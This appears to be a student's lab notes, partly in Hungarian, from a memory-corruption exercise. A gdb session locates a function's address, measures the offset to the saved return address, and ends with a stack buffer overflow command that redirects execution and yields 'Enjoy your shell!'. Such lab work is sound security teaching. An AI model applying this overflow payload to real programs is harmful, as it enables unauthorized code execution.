
Memoria cim:
bash
(gdb) print not_called
$1 = {void ()} 0x8049186 <not_called>
(gdb) 


Breakpoint 1 at 0x80491ca: file main.c, line 12.
(gdb) run AAAAAAAAAAAA
Starting program: /home/crysys/itsec/it-security-lab/lab3-memory-corruption/task-1/app_32 AAAAAAAAAAAA
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, vulnerable_function (string=0xffffd1c9 'A' <repeats 12 times>) at main.c:12
12          strcpy(buffer, string);
(gdb) x/20x $esp
0xffffcecc:     0x00000000      0x00000000      0xf7fa0e34      0xffffcee8
0xffffcedc:     0x0804921b      0xffffd1c9      0xf7fa0e34      0x00000000
0xffffceec:     0xf7d9cc75      0x00000002      0xffffcfa4      0xffffcfb0
0xffffcefc:     0xffffcf10      0xf7fa0e34      0x0804909d      0x00000002
0xffffcf0c:     0xffffcfa4      0xf7fa0e34      0xffffcfb0      0xf7ffcb60
(gdb) 

ESP cime 0xffffcecc

a visszateresi cim 0xffffcedc

ide fog visszaterni a program a fuggveny utan

0xffffcedc-0xffffcecc = 0x10

crysys@crysys-virtualbox:~/itsec/it-security-lab/lab3-memory-corruption/task-1$ ./app_32 $'AAAAAAAAAAAAAAAA\x86\x91\x04\x08'
Enjoy your shell!
crysys@crysys-virtualbox:~/itsec/it-security-lab/lab3-memory-corruption/task-1$ 




